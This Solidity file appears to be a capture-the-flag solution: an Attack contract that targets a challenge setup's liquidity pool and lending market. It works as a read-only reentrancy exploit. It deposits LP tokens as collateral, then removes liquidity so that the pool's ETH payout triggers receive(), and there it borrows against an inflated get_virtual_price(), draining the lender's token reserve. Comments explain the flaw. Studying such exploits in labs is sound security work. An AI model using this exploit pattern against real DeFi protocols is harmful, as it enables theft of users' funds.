// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IToken {
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ILP {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function addLiquidity(uint256) external payable returns (uint256);
    function removeLiquidity(uint256) external;
    function get_virtual_price() external view returns (uint256);
}

interface ILend {
    function deposit(uint256) external;
    function borrow(uint256) external;
    function collateralLP(address) external view returns (uint256);
    function totalDebt() external view returns (uint256);
    function totalCollateralLP() external view returns (uint256);
}

interface ISetup {
    function pool() external view returns (address);
    function lend() external view returns (address);
    function token() external view returns (address);
    function isSolved() external view returns (bool);
}

contract Attack {
    ILP pool;
    ILend lend;
    IToken token;
    uint256 public toRemove;
    uint256 public borrowed;

    constructor(address setup) {
        pool = ILP(ISetup(setup).pool());
        lend = ILend(ISetup(setup).lend());
        token = IToken(ISetup(setup).token());
    }

    function run(uint256 collateral, uint256 burn) external {
        uint256 have = token.balanceOf(address(this));
        token.approve(address(pool), have);
        // token-only entry: no ETH needed, price stays 1e18
        pool.addLiquidity(have);

        uint256 lp = pool.balanceOf(address(this));
        pool.approve(address(lend), lp);
        lend.deposit(collateral);

        // burn the rest: pool pays out its ETH *before* the token side,
        // so get_virtual_price() is inflated inside the ETH callback
        toRemove = burn;
        pool.removeLiquidity(burn);
        toRemove = 0;
    }

    receive() external payable {
        if (toRemove == 0) return;
        uint256 v = pool.get_virtual_price();
        uint256 amt = lend.collateralLP(address(this)) * v / 1e18;
        uint256 reserve = token.balanceOf(address(lend));
        if (amt > reserve) amt = reserve;
        lend.borrow(amt);
        borrowed = amt;
    }
}
